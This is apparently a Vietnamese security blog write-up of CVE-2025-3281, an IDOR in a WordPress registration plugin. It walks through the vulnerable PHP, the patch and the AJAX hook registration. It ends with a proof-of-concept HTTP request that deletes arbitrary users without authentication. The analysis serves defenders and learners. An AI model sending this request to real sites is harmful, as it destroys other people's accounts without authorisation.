# CVE-2025-3281 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **User Registration & Membership – Custom Registration Form, Login Form, and User Profile** cho WordPress bị **lỗ hổng Insecure Direct Object Reference (IDOR)** trong tất cả các phiên bản từ trước đến **4.2.1**, thông qua hàm `create_stripe_subscription()`, do **thiếu kiểm tra hợp lệ đối với khóa `member_id` do người dùng kiểm soát**.
Điều này cho phép **kẻ tấn công chưa xác thực** có thể **xóa tài khoản người dùng bất kỳ** đã đăng ký thông qua plugin này.

* **CVE ID**: [CVE-2025-3281](https://www.cve.org/CVERecord?id=CVE-2025-3281)
* **Vulnerability Type**: Insecure Direct Object References (IDOR)
* **Affected Versions**: <= 4.2.1
* **Patched Versions**: 4.2.2
* **CVSS severity**: Low (5.4)
* **Required Privilege**: Contributor
* **Product**: [WordPress User Registration Plugin](https://wordpress.org/plugins/user-registration/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **User Registration**:  
    * `4.2.1` – **vulnerable**  
    * `4.2.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Theo mô tả của CVE, lỗ hổng nằm trong hàm `create_stripe_subscription()` của plugin. Hàm này xử lý việc tạo subscription Stripe cho người dùng sau khi đăng ký.

```php {title="AJAX.php v4.2.1" data-open=true hl_lines=[5,23]}
public static function create_stripe_subscription() {
    ur_membership_verify_nonce( 'ur_membership_confirm_payment' );
    $customer_id       = isset( $_POST['customer_id'] ) ? $_POST['customer_id'] : '';
    $payment_method_id = isset( $_POST['payment_method_id'] ) ? sanitize_text_field( $_POST['payment_method_id'] ) : '';
    $member_id         = absint( wp_unslash( $_POST['member_id'] ) ); 

    $is_user_created = get_user_meta( $member_id, 'urm_user_just_created' );
    if ( ! $is_user_created ) {
        wp_send_json_error(
            array(
                'message' => __( 'Invalid Request.', 'user-registration' ),
            )
        );
    }

    $stripe_service      = new StripeService();
    $form_response       = isset( $_POST['form_response'] ) ? (array) json_decode( wp_unslash( $_POST['form_response'] ), true ) : array();
    $stripe_subscription = $stripe_service->create_subscription( $customer_id, $payment_method_id, $member_id );

    if ( $stripe_subscription['status'] ) {
        wp_send_json_success( $stripe_subscription );
    } else {
        wp_delete_user( absint( $member_id ) );
        wp_send_json_error(
            array(
                'message' => __( "Something went wrong when updating users payment status" )
            )
        );
    }
}
```

Hàm thực hiện check nonce bằng cách gọi `ur_membership_verify_nonce( 'ur_membership_confirm_payment' );`

Khi search với từ khóa `ur_membership_confirm_payment`:

![Create nonce](nonce.png "Nonce")

nonce được tạo với key là `_confirm_payment_nonce`

Key và value này được thêm trong endpoint `/membership-registration/?`

![Value](value.png "Nonce in response")

Ở đầu hàm, dữ liệu được lấy trực tiếp từ `$_POST`, bao gồm `customer_id`, `payment_method_id` và đặc biệt là `member_id` được lấy trực tiếp từ request mà không có cơ chế xác thực quyền sở hữu.

```php
$member_id = absint( wp_unslash( $_POST['member_id'] ) );
```

Tiếp theo, hàm kiểm tra xem user tương ứng với `member_id` có meta `urm_user_just_created` hay không:

```php
$is_user_created = get_user_meta( $member_id, 'urm_user_just_created' );
if ( ! $is_user_created ) {
    wp_send_json_error( ... );
}
```

Điều này có nghĩa là chỉ cần user đó từng được tạo thông qua luồng đăng ký của plugin thì điều kiện sẽ hợp lệ, **không hề kiểm tra xem người gửi request có quyền thao tác trên user này hay không**.

> [!INFO]
> Cần lưu ý rằng user phải được đăng ký thông qua form `Registration` tại [http://localhost/registration/](http://localhost/registration/), chứ không phải qua `Membership Registration` tại [http://localhost/membership-registration/?](http://localhost/membership-registration/?) thì `$is_user_created` mới thực sự có giá trị.

Sau đó, hàm gọi:

```php
$stripe_subscription = $stripe_service->create_subscription(
    $customer_id,
    $payment_method_id,
    $member_id
);
```

Giá trị trả về của hàm này quyết định luồng xử lý tiếp theo. Nếu `$stripe_subscription['status']` là `false`, đoạn code tiếp theo sẽ xóa user tương ứng với `$member_id`.

```php
if ( $stripe_subscription['status'] ) {
    wp_send_json_success( $stripe_subscription );
} else {
    wp_delete_user( absint( $member_id ) );
    wp_send_json_error(
        array(
            'message' => __( "Something went wrong when updating users payment status" )
        )
    );
}
```

> [!TIP]
> Để khiến `$stripe_subscription['status']` trở thành `false`, ta có thể **truyền thiếu hoặc gửi giá trị không hợp lệ cho `$customer_id` và `$payment_method_id`**, từ đó kiểm soát kết quả trả về. Việc thiếu các tham số này sẽ khiến hàm `create_subscription()` không thể tạo subscription hợp lệ, dẫn đến nhánh xử lý lỗi được kích hoạt.

Điều này dẫn đến lỗ hổng **IDOR (Insecure Direct Object Reference)** nghiêm trọng, cho phép xóa tài khoản người dùng một cách trái phép.

Bản vá `v4.2.2` bổ sung **kiểm tra quyền trước khi thao tác trên user** để ngăn lỗ hổng IDOR:

```php
if ( ! current_user_can( 'edit_user', $member_id ) ) {
	wp_send_json_error(
		array(
			'message' => __( 'You are not allowed to edit this user.', 'user-registration' ),
		)
	);
}
```

* Trước khi gọi `$stripe_service->create_subscription()`, hàm sẽ xác thực xem **người gửi request có quyền chỉnh sửa user với `member_id` hay không**.
* Nếu không có quyền → trả về lỗi JSON và **không thực hiện xóa user**.

![Diff](diff.png "Sự thay đổi trong bản vá")

Điều này đảm bảo rằng chỉ user hợp lệ mới có thể trigger các thao tác dẫn đến `wp_delete_user()`, **đóng lỗ hổng Insecure Direct Object Reference (IDOR)**.

> [!NOTE]
> Tính năng MemberShip mặc định không được bật. bạn cần phải truy cập [http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features](http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features) để bật nó lên.

--- 

Plugin đã đăng ký một loạt các action hook:

```php {title="AJAX.php v4.2.1" data-open=true hl_lines=[11,23,26]}
public static function add_ajax_events() {
    $ajax_events = array(
        'create_membership'          => false,
        'update_membership'          => false,
        'delete_memberships'         => false,
        'update_membership_status'   => false,
        'create_member'              => false,
        'update_member'              => false,
        'delete_members'             => false,
        'confirm_payment'            => true,
        'create_stripe_subscription' => true,
        'register_member'            => true,
        'validate_coupon'            => true,
        'cancel_subscription'        => false,
        'get_group_memberships'      => false,
        'create_membership_group'    => false,
        'delete_membership_groups'   => false,
        'verify_pages'               => false,
        'validate_pg'                => false,
    );
    foreach ( $ajax_events as $ajax_event => $nopriv ) {
        add_action( 'wp_ajax_user_registration_membership_' . $ajax_event, array( __CLASS__, $ajax_event ) );
        if ( $nopriv ) {

            add_action(
                'wp_ajax_nopriv_user_registration_membership_' . $ajax_event,
                array(
                    __CLASS__,
                    $ajax_event,
                )
            );
        }
    }
}
```

Trong danh sách `$ajax_events`, action **`create_stripe_subscription`** được đánh dấu `true`:

```php
'create_stripe_subscription' => true,
```

Điều này có nghĩa là plugin đăng ký cả:

```php
wp_ajax_user_registration_membership_create_stripe_subscription
wp_ajax_nopriv_user_registration_membership_create_stripe_subscription
```

* `wp_ajax_*` → cho người dùng đã đăng nhập
* `wp_ajax_nopriv_*` → cho người dùng **chưa đăng nhập (unauthenticated)**

Vì vậy, **bất kỳ ai cũng có thể gửi request tới endpoint này**, kể cả attacker chưa xác thực. Khi request được gửi:

Kết quả là action `create_stripe_subscription` trở thành **điểm khai thác IDOR**, cho phép **xóa bất kỳ user nào** được tạo qua plugin, ngay cả khi attacker không đăng nhập.

## Flow
{{< mermaid >}}
flowchart TD
A["Attacker (Unauthenticated)"] 
--> B["Send POST request to admin-ajax.php?action=user_registration_membership_create_stripe_subscription"]

B --> C["WordPress routes request via wp_ajax_nopriv_*"]
C --> D["create_stripe_subscription() executed"]

D --> E["Read POST parameters (member_id, customer_id, payment_method_id)"]

E --> F["Check get_user_meta(member_id, 'urm_user_just_created')"]

F -->|Not exists| G["Request rejected"]
F -->|Exists| H["Call create_subscription()"]

H --> I{"Stripe subscription valid?"}

I -->|Yes| J["Return success response"]
I -->|No| K["wp_delete_user(member_id)"]

K --> L["Target user deleted"]

{{< /mermaid >}}

## Proof of Concept (PoC)
1. Truy cập `/membership-registration/?` và lấy giá trị của `_confirm_payment_nonce` từ response
2. Gửi request:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: wordpress_test_cookie=WP%20Cookie%20check; isSidebarEnabled=true; __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; __stripe_sid=7323a342-4cac-4124-9d98-a02abd109a8cd8d073; wp_lang=en_US

action=user_registration_membership_create_stripe_subscription&_ajax_nonce=472f729de7&member_id=member_id_to_delete
```
 
## Conclusion

Lỗ hổng **CVE-2025-3281** xuất phát từ việc hàm `create_stripe_subscription()` cho phép truy cập không xác thực trong khi lại xử lý trực tiếp dữ liệu nhạy cảm do người dùng kiểm soát. Việc thiếu kiểm tra quyền đối với `member_id`, kết hợp với việc endpoint được expose qua `wp_ajax_nopriv_*`, đã tạo điều kiện để attacker xóa tài khoản người dùng một cách trái phép.
Bản vá ở phiên bản 4.2.2 đã khắc phục vấn đề bằng cách bổ sung kiểm tra quyền (`current_user_can`), ngăn chặn hoàn toàn hành vi IDOR.

## Key Takeaways

* Nonce không thay thế cho kiểm tra quyền truy cập.
* Các endpoint `wp_ajax_nopriv_*` cần được kiểm soát chặt chẽ.
* Không nên thực hiện hành động nhạy cảm (xóa user, thay đổi trạng thái) chỉ dựa trên dữ liệu từ client.
* Kiểm tra quyền (`current_user_can`) là bắt buộc khi thao tác với tài nguyên người dùng.
* IDOR thường xuất hiện khi business logic thiếu ràng buộc về quyền, không chỉ do lỗi kỹ thuật đơn thuần.

## References
[IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)

[WordPress User Registration Plugin <= 4.2.1 is vulnerable to Insecure Direct Object References (IDOR)](https://patchstack.com/database/wordpress/plugin/user-registration/vulnerability/wordpress-user-registration-membership-plugin-4-2-1-insecure-direct-object-reference-to-unauthenticated-limited-user-deletion-vulnerability)  

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-25-cve-2025-3281/  

